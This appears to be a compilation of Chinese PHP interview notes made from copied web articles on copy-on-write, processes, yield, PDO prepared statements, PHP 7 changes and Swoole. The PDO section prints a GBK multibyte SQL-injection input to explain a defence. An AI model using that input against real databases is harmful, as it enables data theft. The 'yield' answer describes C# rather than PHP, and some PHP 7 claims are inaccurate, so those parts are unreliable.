var_dump(memory_get_usage());
 
$tipi_copy = $tipi;
var_dump(memory_get_usage());
 
foreach ($tipi_copy as $i) {
    $j += count($i);
}
var_dump(memory_get_usage());
运行结果：

$ php t . php
int(630904)
int(10479840)
int(10479944)
int(10480040)
内存并没有显著提高。

“写时复制”的原理
多个相同值的变量共用同一块内存的确节省了内存空间，但变量的值是会发生变化的，如果在上面的例子中， 指向同一内存的值发生了变化（或者可能发生变化），就需要将变化的值“分离”出去，这个“分离”的操作， 就是“复制”。

在PHP中，Zend引擎为了区别同一个zval地址是否被多个变量共享，引入了ref_count和is_ref两个变量进行标识：

ref_count和is_ref是定义于zval结构体中

is_ref标识是不是用户使用 & 的强制引用；

ref_count是引用计数，用于标识此zval被多少个变量引用，即COW的自动引用，为0时会被销毁；

注：由此可见， $a=$b; 与 $a=&$b; 在PHP对内存的使用上没有区别（值不变化时）；

相信大家也可以了解到PHP中COW的实现原理： PHP 中的 COW 基于引用计数ref_count 和 is_ref 实现， 多一个变量指针，就将 ref_count 加 1， 反之减去 1，减到 0 就销毁； 同理，多一个强制引用 &,就将 is_ref 加 1，反之减去 1。

clipboard.png

讲堂报名地址：https://segmentfault.com/l/15...

PHP笔试面试题精选（二）
课程简述
《PHP笔试面试题精选》课程系列分享关于 PHP 笔试面试会问到的一些问题和知识点，围绕 PHP、数据库、计算机网络、计算机操作系统、设计模式、WEB安全等多个方面进行。

课程内容
由于涉及到的问题和知识点比较多，本期主要讲 PHP基础、WEB安全、计算机网络三个方面有关的问题。

PHP基础方面
PSR规范
PHP新特性
PHP_FPM性能调优
Session垃圾回收机制
WEB安全
XSS攻击原理和防范
CSRF攻击原理和防范
SQL注入攻击防范
密码哈希
计算机网络
HTTP协议
TCP/IP协议
WebSocket连接过程

```

### PHP 进程模型，进程通讯方式，进程线程区别
```
http://www.gxlcms.com/PHPjiqiao-378142.html
PHP进程模型、进程通讯方式、进程线程的区别分别有哪些？
PHP进程模型是一个正在执行的程序，可以分配给处理器并由处理器执行的一个实体；PHP进程通讯方式有管道及有名管道，信号，共享内存等；PHP进程线程的区别有进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元等。



PHP进程模型、进程通讯方式、进程线程的区别分别是：

一、PHP进程模型

进程的概念是操作系统的结构的基础。Multics的设计者在20世纪60年代首次使用了这个技术词语,它比作业更通用一些。关于进程的定义，如下所示：

1、一个正在执行的程序。

2、计算机中正在运行的程序的一个实例。

3、可以分配给处理器并由处理器执行的一个实体。

4、由单一的顺序的执行线程、一个当前状态和一组相关的系统资源所描述的活动单元。

相关学习推荐：PHP编程从入门到精通

二、进程与线程区别

进程是资源分配的基本单位。所有与该进程有关的资源，都被记录在进程控制块PCB中。以表示该进程拥有这些资源或正在使用它们。

另外，进程也是抢占处理机的调度单位，它拥有一个完整的虚拟地址空间。当进程发生调度时，不同的进程拥有不同的虚拟地址空间，而同一进程内的不同线程共享同一地址空间。

与进程相对应，线程与资源分配无关，它属于某一个进程，并与进程内的其他线程一起共享进程的资源。

线程只由相关堆栈（系统栈或用户栈）寄存器和线程控制表TCB组成。寄存器可被用来存储线程内的局部变量，但不能存储其他线程的相关变量。

通常在一个进程中可以包含若干个线程，它们可以利用进程所拥有的资源。在引入线程的操作系统中，通常都是把进程作为分配资源的基本单位，而把线程作为独立运行和独立调度的基本单位。由于线程比进程更小，基本上不拥有系统资源，故对它的调度所付出的开销就会小得多，能更高效的提高系统内多个程序间并发执行的程度，从而显著提高系统资源的利用率和吞吐量。因而近年来推出的通用操作系统都引入了线程，以便进一步提高系统的并发性，并把它视为现代操作系统的一个重要指标。

线程与进程的区别可以归纳为以下4点：

（1）进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元

（2）同一个进程中可以包括多个线程，并且线程共享整个进程的资源（寄存器、堆栈、上下文），一个进行至少包括一个线程。

（3）进程的创建调用fork或者vfork，而线程的创建调用pthread_create，进程结束后它拥有的所有线程都将销毁，而线程的结束不会影响同个进程中的其他线程的结束

（4）线程是轻量级的进程，它的创建和销毁所需要的时间比进程小很多，所有操作系统中的执行功能都是创建线程去完成的

（5）线程中执行时一般都要进行同步和互斥，因为他们共享同一进程的所有资源

（6）线程有自己的私有属性TCB，线程id，寄存器、硬件上下文，而进程也有自己的私有属性进程控制块PCB，这些私有属性是不被共享的，用来标示一个进程或一个线程的标志

三、进程间通信方式

1、管道（Pipe）及有名管道（named pipe）：管道可用于具有亲缘关系进程间的通信，有名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，它还允许无亲缘关系进程间的通信；

2、信号（Signal）：信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；linux除了支持Unix早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction（实际上，该函数是基于BSD的，BSD为了实现可靠信号机制，又能够统一对外接口，用sigaction函数重新实现了signal函数）；

3、报文（Message）队列（消息队列）：消息队列是消息的链接表，包括Posix消息队列system V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。

4、共享内存：使得多个进程可以访问同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。往往与其它通信机制，如信号量结合使用，来达到进程间的同步及互斥。

信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。

5、套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。
```

### yield 核心原理是什么
```
https://www.php.cn/faq/453725.html
yield核心原理是在迭代器块中用于向枚举数对象提供值或发出迭代结束信号，其语句只能出现在iterator块中，该块可用作方法、运算符或访问器的体。



yield核心原理是：

在迭代器块中用于向枚举数对象提供值或发出迭代结束信号。

它的形式为下列之一：

复制代码yield return ;yield break;

备注计算表达式并以枚举数对象值的形式返回；

expression 必须可以隐式转换为迭代器的 yield 类型。

yield 语句只能出现在 iterator 块中，该块可用作方法、运算符或访问器的体。

这类方法、运算符或访问器的体受以下约束的控制：

不允许不安全块。

方法、运算符或访问器的参数不能是 ref 或 out。

yield 语句不能出现在匿名方法中。

当和 expression 一起使用时，yield return 语句不能出现在 catch 块中或含有一个或多个 catch 子句的 try 块中。示例在下面的示例中，迭代器块（这里是方法 Power(int number, int power)）中使用了 yield 语句。当调用 Power 方法时，它返回一个包含数字幂的可枚举对象。

注意 Power 方法的返回类型是 IEnumerable（一种迭代器接口类型）。

```

### PDO prepare 原理
```
https://www.cnblogs.com/DataArt/p/10240829.html
Prepare的好处 
    Prepare SQL产生的原因。首先从mysql服务器执行sql的过程开始讲起，SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。词法分析->语法分析这两个阶段我们称之为硬解析。词法分析识别sql中每个词，语法分析解析SQL语句是否符合sql语法，并得到一棵语法树（Lex）。对于只是参数不同，其他均相同的sql，它们执行时间不同但硬解析的时间是相同的。而同一SQL随着查询数据的变化，多次查询执行时间可能不同，但硬解析的时间是不变的。对于sql执行时间较短，sql硬解析的时间占总执行时间的比率越高。而对于淘宝应用的绝大多数事务型SQL，查询都会走索引，执行时间都比较短。因此淘宝应用db sql硬解析占的比重较大。 

    Prepare的出现就是为了优化硬解析的问题。Prepare在服务器端的执行过程如下

 1）  Prepare 接收客户端带”?”的sql, 硬解析得到语法树(stmt->Lex), 缓存在线程所在的preparestatement cache中。此cache是一个HASH MAP. Key为stmt->id. 然后返回客户端stmt->id等信息。

 2）  Execute 接收客户端stmt->id和参数等信息。注意这里客户端不需要再发sql过来。服务器根据stmt->id在preparestatement cache中查找得到硬解析后的stmt, 并设置参数，就可以继续后面的优化和执行了。

    Prepare在execute阶段可以节省硬解析的时间。如果sql只执行一次，且以prepare的方式执行，那么sql执行需两次与服务器交互（Prepare和execute）, 而以普通（非prepare）方式，只需要一次交互。这样使用prepare带来额外的网络开销，可能得不偿失。我们再来看同一sql执行多次的情况，比如以prepare方式执行10次，那么只需要一次硬解析。这时候  额外的网络开销就显得微乎其微了。因此prepare适用于频繁执行的SQL。

    Prepare的另一个作用是防止sql注入，不过这个是在客户端jdbc通过转义实现的，跟服务器没有关系。 

硬解析的比重
   压测时通过perf 得到的结果，硬解析相关的函数比重都比较靠前（MYSQLparse 4.93%, lex_one_token 1.79%, lex_start 1.12%）总共接近8%。因此，服务器使用prepare是可以带来较多的性能提升的。

jdbc与prepare 
  jdbc服务器端的参数：

   useServerPrepStmts：默认为false. 是否使用服务器prepare开关

  jdbc客户端参数：

   cachePrepStmts：默认false.是否缓存prepareStatement对象。每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 同一连接下，不同stmt可以不用重新创建prepareStatement对象。

   prepStmtCacheSize：LRU cache中prepareStatement对象的个数。一般设置为最常用sql的个数。

   prepStmtCacheSqlLimit：prepareStatement对象的大小。超出大小不缓存。

  Jdbc对prepare的处理过程： 

  useServerPrepStmts=true时Jdbc对prepare的处理

   1）  创建PreparedStatement对象，向服务器发送COM_PREPARE命令，并传送带问号的sql. 服务器返回jdbc stmt->id等信息

   2）  向服务器发送COM_EXECUTE命令,并传送参数信息。

  useServerPrepStmts=false时Jdbc对prepare的处理

   1）  创建PreparedStatement对象，此时不会和服务器交互。

   2） 根据参数和PreparedStatement对象拼接完整的SQL，向服务器发送QUERY命令

   我们再看参数cachePrepStmts打开时在useServerPrepStmts为true或false时，均缓存PreparedStatement对象。只不过useServerPrepStmts为的true缓存PreparedStatement对象包含服务器的stmt->id等信息，也就是说如果重用了PreparedStatement对象，那么就省去了和服务器通讯（COM_PREPARE命令）的开销。而useServerPrepStmts=false是，开启cachePrepStmts缓存PreparedStatement对象只是简单的sql解析信息，因此此时开启cachePrepStmts意义不是太大。

我们来开看一段java代码         

复制代码
 
            Connection con = null;
            PreparedStatement ps = null;
            String sql = "select * from user where id=?";
            ps = con.prepareStatement(sql);            
            ps.setInt(1, 1);‍‍            
            ps.executeQuery();            
            ps.close();            
            ps = con.prepareStatement(sql);            
            ps.setInt(1, 3);            
            ps.executeQuery();            
            ps.close();
 
复制代码
    这段代码在同一会话中两次prepare执行同一语句，并且之间有ps.close();

    useServerPrepStmts=false时，服务器会两次硬解析同一SQL。

    useServerPrepStmts=true, cachePrepStmts=false时服务器仍然会两次硬解析同一SQL。

    useServerPrepStmts=true, cachePrepStmts=true时服务器只会硬解析一次SQL。

 

    如果两次prepare之间没有ps.close();那么cachePrepStmts=true，cachePrepStmts=false也只需一次硬解析. 

    因此，客户端对同一sql,频繁分配和释放PreparedStatement对象的情况下，开启cachePrepStmts参数是很有必要的。

测试
   1)做了一个简单的测试，主要测试prepare的效果和useServerPrepStmts参数的影响.       

复制代码
 
        cnt = 5000;
        // no prepare
        String sql = "select biz_order_id,out_order_id,seller_nick,buyer_nick,seller_id,buyer_id,auction_id,auction_title,auction_price,buy_amount,biz_type,sub_biz_type,fail_reason,pay_status,logistics_status,out_trade_status,snap_path,gmt_create,status,ifnull(buyer_rate_status, 4) buyer_rate_status from tc_biz_order_0030 where " +
        "parent_id = 594314511722841 or parent_id =547667559932641;";

        begin = new Date();
        System.out.println("begin:" + df.format(begin));
        
        stmt = con.createStatement();
        for (int i = 0; i < cnt; i++)
        {            
            stmt.executeQuery(sql);
        } 
               
        end = new Date();
        System.out.println("end:" + df.format(end));
        
        long temp = end.getTime() - begin.getTime();
        System.out.println("no perpare interval:" + temp);
        
        
        // test prepare       
        sql = "select biz_order_id,out_order_id,seller_nick,buyer_nick,seller_id,buyer_id,auction_id,auction_title,auction_price,buy_amount,biz_type,sub_biz_type,fail_reason,pay_status,logistics_status,out_trade_status,snap_path,gmt_create,status,ifnull(buyer_rate_status, 4) buyer_rate_status from tc_biz_order_0030 where " +
                "parent_id = 594314511722841 or parent_id =?;";
        ps = con.prepareStatement(sql);
        BigInteger param = new BigInteger("547667559932641");
        
        begin = new Date();
        System.out.println("begin:" + df.format(begin));
        
        for (int i = 0; i < cnt; i++)
        {
            ps.setObject(1, param);
            ps.executeQuery(); 
        } 
   
        end = new Date();
        System.out.println("end:" + df.format(end));
        
        temp = end.getTime() - begin.getTime();
        System.out.println("prepare interval:" + temp);
 
复制代码
经多次采样测试结果如下
 	非prepare和prepare时间比
useServerPrepStmts=true	0.93
useServerPrepStmts=false	1.01
 

结论：

useServerPrepStmts=true时，prepare提升7%；

useServerPrepStmts=false时，prepare与非prepare性能相当。 

 

如果将语句简化为select * from tc_biz_order_0030 where parent_id =?。那么测试的结论useServerPrepStmts=true时，prepare仅提升2%；sql越简单硬解析的时间就越少，prepare的提升就越少。

 

注意：这个测试是在单个连接，单条sql的理想情况下进行的，线上会出现多连接多sql,还有sql执行频率，sql的复杂程度等不同，因此prepare的提升效果会随具体环境而变化。 

2）prepare 前后的perf top 对比 

   以下为非prepare    

复制代码
 
     6.46%   mysqld  mysqld              [.] _Z10MYSQLparsePv
     3.74%   mysqld  libc-2.12.so        [.] __memcpy_ssse3
     2.50%   mysqld  mysqld              [.] my_hash_sort_utf8
     2.15%   mysqld  mysqld              [.] cmp_dtuple_rec_with_match
     2.05%   mysqld  mysqld              [.] _ZL13lex_one_tokenPvS_
     1.46%   mysqld  mysqld              [.] buf_page_get_gen
     1.34%   mysqld  mysqld              [.] page_cur_search_with_match
     1.31%   mysqld  mysqld              [.] _ZL14build_templateP19row_prebuilt_structP3THDP5TABLEj
     1.24%   mysqld  mysqld              [.] rec_init_offsets
     1.11%   mysqld  libjemalloc.so.1    [.] free
     1.09%   mysqld  mysqld              [.] rec_get_offsets_func
     1.01%   mysqld  libjemalloc.so.1    [.] malloc
     0.96%   mysqld  libc-2.12.so        [.] __strlen_sse42
     0.93%   mysqld  mysqld              [.] _ZN4JOIN8optimizeEv
     0.91%   mysqld  mysqld              [.] _ZL15get_hash_symbolPKcjb
     0.88%   mysqld  mysqld              [.] row_search_for_mysql
     0.86%   mysqld  [kernel.kallsyms]   [k] tcp_recvmsg    
 
复制代码
 

 以下为perpare    

复制代码
 
     3.46%   mysqld  libc-2.12.so        [.] __memcpy_ssse3
     2.32%   mysqld  mysqld              [.] cmp_dtuple_rec_with_match
     2.14%   mysqld  mysqld              [.] _ZL14build_templateP19row_prebuilt_structP3THDP5TABLEj
     1.96%   mysqld  mysqld              [.] buf_page_get_gen
     1.66%   mysqld  mysqld              [.] page_cur_search_with_match
     1.54%   mysqld  mysqld              [.] row_search_for_mysql
     1.44%   mysqld  mysqld              [.] btr_cur_search_to_nth_level
     1.41%   mysqld  libjemalloc.so.1    [.] free
     1.35%   mysqld  mysqld              [.] rec_init_offsets
     1.32%   mysqld  [kernel.kallsyms]   [k] kfree
     1.14%   mysqld  libjemalloc.so.1    [.] malloc
     1.08%   mysqld  [kernel.kallsyms]   [k] fget_light
     1.05%   mysqld  mysqld              [.] rec_get_offsets_func
     0.99%   mysqld  mysqld              [.] _ZN8Protocol24send_result_set_metadataEP4ListI4ItemEj
     0.90%   mysqld  mysqld              [.] sync_array_print_long_waits
     0.87%   mysqld  mysqld              [.] page_rec_get_n_recs_before
     0.81%   mysqld  mysqld              [.] _ZN4JOIN8optimizeEv
     0.81%   mysqld  libc-2.12.so        [.] __strlen_sse42
     0.78%   mysqld  mysqld              [.] _ZL20make_join_statisticsP4JOINP10TABLE_LISTP4ItemP16st_dynamic_array
     0.72%   mysqld  [kernel.kallsyms]   [k] tcp_recvmsg
     0.63%   mysqld  libpthread-2.12.so  [.] __pthread_getspecific_internal
     0.63%   mysqld  [kernel.kallsyms]   [k] sk_run_filter
     0.60%   mysqld  mysqld              [.] _Z19find_field_in_tableP3THDP5TABLEPKcjbPj
     0.60%   mysqld  mysqld              [.] page_check_dir
     0.57%   mysqld  mysqld              [.] _Z16dispatch_command19enum_server_commandP3THDP
 
复制代码
    对比可以发现 MYSQLparse lex_one_token在prepare时已优化掉了。

思考
   1 开启cachePrepStmts的问题，前面谈到每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 在分表较多，大连接的情况下，可能会个应用服务器带来内存问题。这里有个前提是ibatis是默认使用prepare的。 在mybatis中，标签statementType可以指定某个sql是否是使用prepare.

statementType Any one of STATEMENT, PREPARED or CALLABLE. This causes MyBatis to use Statement, PreparedStatement orCallableStatement respectively. Default: PREPARED.

这样可以精确控制只对频率较高的sql使用prepare，从而控制使用prepare sql的个数，减少内存消耗。遗憾的是目前集团貌似大多使用的是ibatis 2.0版本，不支持statementType

标签。

    2 服务器端prepare cache是一个HASH MAP. Key为stmt->id,同时也是每个连接都维护一个。因此也有可能出现内存问题，待实际测试。如有必要需改造成Key为sql的全局cache，这样不同连接的相同prepare sql可以共享。 

    3 oracle prepare与mysql prepare的区别：

      mysql与oracle有一个重大区别是mysql没有oracle那样的执行计划缓存。前面我们讲到SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。oracle的prepare实际上包括以下阶段：词法分析->语法分析->语义分析->执行计划优化，也就是说oracle的prepare做了更多的事情，execute只需要执行即可。因此，oracle的prepare比mysql更高效。
https://www.jb51.net/article/56612.htm
我们都知道，只要合理正确使用PDO,可以基本上防止SQL注入的产生，本文主要回答以下两个问题：
为什么要使用PDO而不是mysql_connect？
为何PDO能防注入？
使用PDO防注入的时候应该特别注意什么?
 
一、为何要优先使用PDO?

PHP手册上说得很清楚：
Prepared statements and stored procedures
Many of the more mature databases support the concept of prepared statements. What are they? They can be thought of as a kind of compiled template for the SQL that an application wants to run, that can be customized using variable parameters. Prepared statements offer two major benefits:

The query only needs to be parsed (or prepared) once, but can be executed multiple times with the same or different parameters. When the query is prepared, the database will analyze, compile and optimize its plan for executing the query. For complex queries this process can take up enough time that it will noticeably slow down an application if there is a need to repeat the same query many times with different parameters. By using a prepared statement the application avoids repeating the analyze/compile/optimize cycle. This means that prepared statements use fewer resources and thus run faster.
 

The parameters to prepared statements don't need to be quoted; the driver automatically handles this. If an application exclusively uses prepared statements, the developer can be sure that no SQL injection will occur (however, if other portions of the query are being built up with unescaped input, SQL injection is still possible).
 
即使用PDO的prepare方式，主要是提高相同SQL模板查询性能、阻止SQL注入
同时，PHP手册中给出了警告信息
Prior to PHP 5.3.6, this element was silently ignored. The same behaviour can be partly replicated with the PDO::MYSQL_ATTR_INIT_COMMAND driver option, as the following example shows.
Warning
The method in the below example can only be used with character sets that share the same lower 7 bit representation as ASCII, such as ISO-8859-1 and UTF-8. Users using character sets that have different representations (such as UTF-16 or Big5) must use the charset option provided in PHP 5.3.6 and later versions.
 
意思是说，在PHP 5.3.6及以前版本中，并不支持在DSN中的charset定义，而应该使用PDO::MYSQL_ATTR_INIT_COMMAND设置初始SQL, 即我们常用的 set names gbk指令。
 
我看到一些程序，还在尝试使用addslashes达到防注入的目的，殊不知这样其实问题更多, 详情请看https://www.jb51.net/article/49205.htm
还有一些做法：在执行数据库查询前，将SQL中的select, union, ....之类的关键词清理掉。这种做法显然是非常错误的处理方式，如果提交的正文中确实包含 the students's union , 替换后将篡改本来的内容，滥杀无辜，不可取。
 
二、为何PDO能防SQL注入？
请先看以下PHP代码：
复制代码代码如下:
<?php
$pdo = new PDO("mysql:host=192.168.0.1;dbname=test;charset=utf8","root");
$st = $pdo->prepare("select * from info where id =? and name = ?");
 
$id = 21;
$name = 'zhangsan';
$st->bindParam(1,$id);
$st->bindParam(2,$name);
 
$st->execute();
$st->fetchAll();
?>

 
环境如下：
PHP 5.4.7
Mysql 协议版本 10
MySQL Server 5.5.27
 
为了彻底搞清楚php与mysql server通讯的细节，我特别使用了wireshark抓包进行研究之,安装wireshak之后，我们设置过滤条件为tcp.port==3306, 如下图：
 
 
 
如此只显示与mysql 3306端口的通信数据，避免不必要的干扰。
特别要注意的是wireshak基于wincap驱动，不支持本地环回接口的侦听（即使用php连接本地mysql的方法是无法侦听的），请连接其它机器（桥接网络的虚拟机也可）的MySQL进行测试。
 
然后运行我们的PHP程序，侦听结果如下，我们发现，PHP只是简单地将SQL直接发送给MySQL Server :
 
 
 
其实，这与我们平时使用mysql_real_escape_string将字符串进行转义，再拼接成SQL语句没有差别（只是由PDO本地驱动完成转义的），显然这种情况下还是有可能造成SQL注入的，也就是说在php本地调用pdo prepare中的mysql_real_escape_string来操作query，使用的是本地单字节字符集，而我们传递多字节编码的变量时，有可能还是会造成SQL注入漏洞(php 5.3.6以前版本的问题之一，这也就解释了为何在使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset的原因。
 
针对php 5.3.6以前版本，以下代码仍然可能造成SQL注入问题：
复制代码代码如下:
$pdo->query('SET NAMES GBK');
$var = chr(0xbf) . chr(0x27) . " OR 1=1 /*";
$query = "SELECT * FROM info WHERE name = ?";
$stmt = $pdo->prepare($query);
$stmt->execute(array($var));

 
原因与上面的分析是一致的。
 
而正确的转义应该是给mysql Server指定字符集，并将变量发送给MySQL Server完成根据字符转义。
 
那么，如何才能禁止PHP本地转义而交由MySQL Server转义呢？
PDO有一项参数，名为PDO::ATTR_EMULATE_PREPARES ，表示是否使用PHP本地模拟prepare，此项参数默认值未知。而且根据我们刚刚抓包分析结果来看，php 5.3.6+默认还是使用本地变量转，拼接成SQL发送给MySQL Server的，我们将这项值设置为false, 试试效果，如以下代码：
复制代码代码如下:
<?php
$pdo = new PDO("mysql:host=192.168.0.1;dbname=test;","root");
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);//这是我们刚加入的内容
 
$st = $pdo->prepare("select * from info where id =? and name = ?");
$id = 21;
$name = 'zhangsan';
 
$st->bindParam(1,$id);
$st->bindParam(2,$name);
$st->execute();
$st->fetchAll();
?>

 
运行一下程序，使用wireshark抓包分析，得出的结果如下：




看到了吗？这就是神奇之处，可见这次PHP是将SQL模板和变量是分两次发送给MySQL的，由MySQL完成变量的转义处理，既然变量和SQL模板是分两次发送的，那么就不存在SQL注入的问题了，但需要在DSN中指定charset属性，如：
复制代码代码如下:
$pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root');

 
如此，即可从根本上杜绝SQL注入的问题。如果你对此不是很清楚，可以发邮件至zhangxugg@163.com, 一起探讨。
 
三、使用PDO的注意事项
知道以上几点之后，我们就可以总结使用PDO杜绝SQL注入的几个注意事项：

1.  php升级到5.3.6+，生产环境强烈建议升级到php 5.3.9+ php 5.4+，php 5.3.8存在致命的hash碰撞漏洞。
 
2. 若使用php 5.3.6+, 请在在PDO的DSN中指定charset属性

3. 如果使用了PHP 5.3.6及以前版本，设置PDO::ATTR_EMULATE_PREPARES参数为false（即由MySQL进行变量处理），php 5.3.6以上版本已经处理了这个问题，无论是使用本地模拟prepare还是调用mysql server的prepare均可。在DSN中指定charset是无效的，同时set names <charset>的执行是必不可少的。
 
4. 如果使用了PHP 5.3.6及以前版本, 因Yii框架默认并未设置ATTR_EMULATE_PREPARES的值，请在数据库配置文件中指定emulatePrepare的值为false。
 
那么，有个问题，如果在DSN中指定了charset, 是否还需要执行set names <charset>呢？

是的，不能省。set names <charset>其实有两个作用：

A.  告诉mysql server, 客户端（PHP程序）提交给它的编码是什么
B.  告诉mysql server, 客户端需要的结果的编码是什么

也就是说，如果数据表使用gbk字符集，而PHP程序使用UTF-8编码，我们在执行查询前运行set names utf8, 告诉mysql server正确编码即可，无须在程序中编码转换。这样我们以utf-8编码提交查询到mysql server, 得到的结果也会是utf-8编码。省却了程序中的转换编码问题，不要有疑问，这样做不会产生乱码。
 
那么在DSN中指定charset的作用是什么? 只是告诉PDO, 本地驱动转义时使用指定的字符集（并不是设定mysql server通信字符集），设置mysql server通信字符集，还得使用set names <charset>指令。
 
我真想不通，一些新的项目，为何不使用PDO而使用传统的mysql_XXX函数库呢？如果正确使用PDO，可以从根本上杜绝SQL注入，我强烈建议各个公司的技术负责人、一线技术研发人员，要对这个问题引起重视，尽可能使用PDO加快项目进度和安全质量。
```

### PHP 7 与 PHP 5 有什么区别
```
https://www.cnblogs.com/FLy-1992/p/11647839.html
PHP7距正式发布以及有挺长时间了，刚出道就号称比旧版本快了几倍，各种开源框架或系统运行在PHP7上速度效率提高了几倍。那么php7和php5之间的区别是什么？下面本篇文章就来给大家简单介绍一下，希望对你们有所帮助。

 

php7和php5区别之间的区别：

1、性能提升：PHP7比PHP5.0性能提升了两倍。

2、全面一致的64位支持。

3、以前的许多致命错误，现在改成抛出异常。

4、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。

5、PHP 7.0比PHP5.0新增了空接合操作符。

6、PHP 7.0比PHP5.0新增加了结合比较运算符。

7、PHP 7.0比PHP5.0新增加了函数的返回类型声明。

8、PHP 7.0比PHP5.0新增加了标量类型声明。

9、PHP 7.0比PHP5.0新增加匿名类。

为什么 PHP7 比 PHP5 性能提升了？

1、变量存储字节减小，减少内存占用，提升变量操作速度

2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率

3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
https://www.jb51.net/article/171609.htm
php5与php7的区别是什么？下面本篇文章就来给大家对比一下php5与php7，介绍php5与php7之间的区别。有一定的参考价值，有需要的朋友可以参考一下，希望对你有所帮助。

php5与php7之间的区别：

1、性能提升：PHP7比PHP5.0性能提升了两倍。

2、以前的许多致命错误，现在改成抛出异常。

3、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。

4、PHP 7.0比PHP5.0新增了空接合操作符。

5、PHP 7.0比PHP5.0新增加了结合比较运算符。

6、PHP 7.0比PHP5.0新增加了函数的返回类型声明。

7、PHP 7.0比PHP5.0新增加了标量类型声明。

8、PHP 7.0比PHP5.0新增加匿名类。

9、错误处理和64位支持

如果您了解错误和异常之间的区别，那么您就会知道在PHP 5中处理致命错误非常不容易。PHP7简化了流程，因为它已用可以轻松处理的异常替换了几个主要错误。这是通过引入新的引擎异常对象实现的。

您可能已经知道，PHP 5不支持64位整数或大文件，但PHP 7中的情况已发生变化。PHP7具有64位支持，因此您也可以使用本机64位整数作为大文件，因此，您可以在64位系统体系结构上完美运行应用程序。

10、声明返回类型

在PHP 5中，程序员无法定义函数或方法的返回类型。在现实生活中，这是一个巨大的缺点，因为程序员无法防止意外的返回类型并在其他情况下生成异常。

幸运的是，PHP 7允许程序员根据期望的返回值声明函数的返回类型。这肯定会使代码健壮和准确。有四种不同的返回类型可用-bool，int，string和float。

为什么 PHP7 比 PHP5 性能提升了？

1、变量存储字节减小，减少内存占用，提升变量操作速度

2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率

3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率

以上就是php5与php7的区别是什么？的详细内容，更多请关注脚本之家其它相关文章！
https://zhuanlan.zhihu.com/p/96785667
php5与php7之间的区别：
1、性能提升：PHP7比PHP5.0性能提升了两倍。

2、以前的许多致命错误，现在改成抛出异常。

3、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。

4、PHP 7.0比PHP5.0新增了空接合操作符。

5、PHP 7.0比PHP5.0新增加了结合比较运算符。

6、PHP 7.0比PHP5.0新增加了函数的返回类型声明。

7、PHP 7.0比PHP5.0新增加了标量类型声明。

8、PHP 7.0比PHP5.0新增加匿名类。

9、错误处理和64位支持

如果您了解错误和异常之间的区别，那么您就会知道在PHP 5中处理致命错误非常不容易。PHP7简化了流程，因为它已用可以轻松处理的异常替换了几个主要错误。这是通过引入新的引擎异常对象实现的。

您可能已经知道，PHP 5不支持64位整数或大文件，但PHP 7中的情况已发生变化。PHP7具有64位支持，因此您也可以使用本机64位整数作为大文件，因此，您可以在64位系统体系结构上完美运行应用程序。

10、声明返回类型

在PHP 5中，程序员无法定义函数或方法的返回类型。在现实生活中，这是一个巨大的缺点，因为程序员无法防止意外的返回类型并在其他情况下生成异常。

幸运的是，PHP 7允许程序员根据期望的返回值声明函数的返回类型。这肯定会使代码健壮和准确。有四种不同的返回类型可用-bool，int，string和float。

为什么 PHP7 比 PHP5 性能提升了？

1、变量存储字节减小，减少内存占用，提升变量操作速度

2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率

3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
```

### Swoole 适用场景，协程实现方式
```
https://blog.csdn.net/assasin0308/article/details/93649725
什么是协程
协程(Coroutine)也叫用户态线程，其通过协作而不是抢占来进行切换。相对于进程或者线程，协程所有的操作都可以在用户态完成，创建和切换的消耗更低。协程是进程的补充，或者是互补关系。

         要理解是什么是“用户态的线程”，必然就要先理解什么是“内核态的线程”。 内核态的线程是由操作系统来进行调度的，在切换线程上下文时，要先保存上一个线程的上下文，然后执行下一个线程，当条件满足时，切换回上一个线程，并恢复上下文。 协程也是如此，只不过，用户态的线程不是由操作系统来调度的，而是由程序员来调度的，就是所谓的用户态的线程。



协程的适用场景
高并发服务，如秒杀系统、高性能API接口、RPC服务器，使用协程模式，服务的容错率会大大增加，某些接口出现故障时，不会导致整个服务崩溃。

      爬虫，可实现非常巨大的并发能力，即使是非常慢速的网络环境，也可以高效地利用带宽。

      即时通信服务，如IM聊天、游戏服务器、物联网、消息服务器等等，可以确保消息通信完全无阻塞，每个消息包均可即时地被处理。

 

协程与线程区别
Swoole的协程在底层实现上是单线程的，因此同一时间只有一个协程在工作，协程的执行是串行的。这与线程不同，多个线程会被操作系统调度到多个CPU并行执行。

一个协程正在运行时，其他协程会停止工作。当前协程执行阻塞IO操作时会挂起，底层调度器会进入事件循环。当有IO完成事件时，底层调度器恢复事件对应的协程的执行。

对CPU多核的利用，仍然依赖于Swoole引擎的多进程机制。

 

